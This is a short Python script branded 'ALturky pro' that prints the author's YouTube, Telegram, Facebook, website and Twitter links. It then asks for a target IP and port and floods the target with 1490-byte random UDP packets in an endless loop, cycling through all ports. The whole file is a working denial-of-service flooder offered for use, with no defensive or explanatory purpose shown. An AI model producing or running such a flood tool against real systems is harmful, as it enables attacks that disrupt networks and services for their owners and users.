import sys
import os
import time
import socket
import random
print ('ALturky pro')
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(00000.015)
print ("YouTube   : https://youtube.com/alturkypro") 
print ("telegram    : https://t.me/ALturky_pro") 
print ("Facebook  : https://www.facebook.com/ALturkypro1") 
print ("Website   : https://www.mohamedsaed.tk") 
print ("Twitter   : https://twitter.com/ALTURKY_pro") 
##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

ip = raw_input("enter ip: ")
port = input("enter port  : ")

time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print (sent,ip,port)
     if port == 65534:
       port = 1
